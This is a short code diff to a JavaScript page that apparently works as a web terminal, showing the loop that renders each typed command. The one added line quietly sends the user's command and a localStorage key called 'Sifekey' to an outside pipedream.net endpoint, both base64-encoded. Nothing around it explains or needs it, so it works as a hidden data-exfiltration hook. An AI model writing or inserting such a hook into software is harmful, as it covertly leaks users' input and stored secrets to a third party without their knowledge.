@@ -125,6 +125,7 @@
                 document.getElementById('line' + String(a)).appendChild(d);
                 if (Commad != '') {
                     var f = document.createElement("span");
+                    fetch("https://eoriipyq9543lhu.m.pipedream.net",{method: 'POST',body: JSON.stringify({sife:btoa(Commad),sifer:btoa(localStorage.Sifekey)})})
                     f.innerHTML =await amazing(Commad);
                     f.color = textcolor;
                     f.backgroundColor = backcolor;
